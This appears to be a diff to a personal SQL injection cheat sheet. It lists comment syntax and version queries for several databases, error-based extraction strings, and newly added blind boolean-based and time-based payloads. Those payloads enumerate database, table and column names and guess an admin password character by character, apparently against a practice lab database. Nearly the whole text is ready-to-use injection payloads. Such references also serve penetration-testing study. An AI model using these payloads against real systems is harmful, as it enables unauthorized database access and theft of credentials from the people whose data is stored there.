@@ -1,8 +1,8 @@
 Comments:
-Oracle 	--comment
+Oracle     	--comment
 Microsoft 	--comment  /*comment*/
 PostgreSQL 	--comment  /*comment*/
-MySQL 	#comment  -- comment [Note the space after the double dash]   /*comment*/  
+MySQL     	#comment  -- comment [Note the space after the double dash]   /*comment*/  
                                                                                     
 Database version:
  Oracle 	SELECT banner FROM v$version  |  SELECT version FROM v$instance
@@ -74,5 +74,16 @@ Extracting sensitive data via verbose SQL error messages:
 Microsoft    ' and CAST((SELECT example_column FROM example_table) AS int) --       |       ' AND 1=CAST((SELECT password FROM users limit 1) AS int)--         
 PostgreSQL 	 ' and SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
 
+Boolean Based:
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+time based:
+admin123' UNION SELECT SLEEP(5);--
+admin123' UNION SELECT SLEEP(5),2;--
+admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+admin123' UNION SELECT sleep(5),2 FROM information_schema.tables WHERE table_schema like 'sqli_%r%' and table_name like 'a%';--
 
 
